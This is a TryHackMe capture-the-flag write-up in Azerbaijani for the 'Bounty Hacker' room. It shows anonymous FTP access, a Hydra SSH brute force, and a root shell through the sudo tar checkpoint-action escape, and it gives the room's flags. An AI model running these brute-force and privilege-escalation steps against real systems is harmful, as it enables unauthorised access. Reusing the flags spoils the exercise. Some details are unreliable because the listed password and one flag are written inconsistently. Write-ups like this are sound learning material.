# 🤠 TryHackMe — Bounty Hacker Writeup

**Platforma:** TryHackMe  
**Room:** [Bounty Hacker](https://tryhackme.com/room/cowboyhacker)  
**Çətinlik:** Easy  
**OS:** Linux  
**Tarix:** 2026  

---

## 📋 Xülasə

Bu room əsasən FTP anonymous giriş, SSH bruteforce və sudo tar privilege escalation mərhələlərindən ibarətdir. Cowboy Bebop mövzusunda hazırlanmış maraqlı bir CTF-dir.

---

## 🔍 1. Kəşfiyyat (Reconnaissance)

### Nmap Scan

```bash
nmap -sV -sC -p- 10.10.X.X
```

**Nəticə:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2
80/tcp open  http    Apache httpd 2.4.18
```

3 port açıqdır:
- **21** — FTP
- **22** — SSH
- **80** — HTTP

---

## 🌐 2. Web Səhifəsi

`http://10.10.X.X` ünvanına daxil olduqda Cowboy Bebop mövzusunda bir səhifə görünür. Mənalı bir şey tapılmadı, davam edirik.

---

## 📁 3. FTP — Anonymous Giriş

```bash
ftp 10.10.X.X
```

```
Name: anonymous
Password: (boş buraxın)
```

FTP-yə anonymous ilə daxil olundu. Faylları yoxlayaq:

```bash
ftp> ls
```

```
locks.txt
task.txt
```

Faylları yükləyək:

```bash
ftp> get locks.txt
ftp> get task.txt
```

### task.txt məzmunu:

```
1.) Spar with Mineeta
2.) Find the key to the old locked door
3.) Get out of Bed
4.) Shop at the market
5.) ...

-lin
```

> 💡 **İpucu:** İmza `lin` — bu bizim SSH username-imiz ola bilər!

### locks.txt məzmunu:

```
rEddrAGON
ReDdr4g0nSynd!cat3
...
```

> 💡 Bu fayl **password list**-dir — SSH bruteforce üçün istifadə edəcəyik!

---

## 🔐 4. SSH Bruteforce — Hydra

```bash
hydra -l lin -P locks.txt ssh://10.10.X.X
```

**Nəticə:**

```
[22][ssh] host: 10.10.X.X   login: lin   password: RedDr4gonSynd!cat3
```

> ✅ Parol tapıldı!

---

## 💻 5. SSH Girişi

```bash
ssh lin@10.10.X.X
```

```
Password: RedDr4gonSynd!cat3
```

Sistemə daxil olduq. İlk flagı tapaq:

```bash
cat user.txt
```

```
THM{CR1M3_SYN D1C4T3}
```

> 🏁 **User Flag əldə edildi!**

---

## ⚡ 6. Privilege Escalation — sudo tar

Sudo icazələrini yoxlayaq:

```bash
sudo -l
```

**Nəticə:**

```
(root) /bin/tar
```

> 💡 `tar` root ilə işləyə bilir — bu klassik GTFOBins exploit-dir!

### Exploit:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

```
# whoami
root
```

> ✅ Root oldug!

---

## 🏆 7. Root Flagı

```bash
cat /root/root.txt
```

```
THM{80UN7Y_h4cK3r}
```

> 🏁 **Root Flag əldə edildi!**

---

## 📊 Xülasə Cədvəli

| Mərhələ | Alət | Nəticə |
|---|---|---|
| Port Scan | Nmap | FTP, SSH, HTTP tapıldı |
| FTP Giriş | ftp (anonymous) | locks.txt, task.txt |
| Bruteforce | Hydra | lin:RedDr4gonSynd!cat3 |
| User Flag | SSH | THM{CR1M3_SYND1C4T3} |
| PrivEsc | sudo tar (GTFOBins) | Root shell |
| Root Flag | cat | THM{80UN7Y_h4cK3r} |

---

## 🛠️ İstifadə Edilən Alətlər

- `nmap` — port kəşfiyyatı
- `ftp` — anonymous giriş
- `hydra` — SSH bruteforce
- `sudo -l` — privilege yoxlaması
- GTFOBins — `tar` exploit

---

## 📚 Öyrənilənlər

1. **Anonymous FTP** həmişə yoxlanılmalıdır
2. FTP-dəki fayllar həssas məlumat saxlaya bilər
3. `sudo -l` privilege escalation üçün ilk addımdır
4. [GTFOBins](https://gtfobins.github.io/) — sudo binary exploit-ləri üçün əvəzolunmaz resurs

---

*Writeup hazırlandı — TryHackMe Bounty Hacker Room*
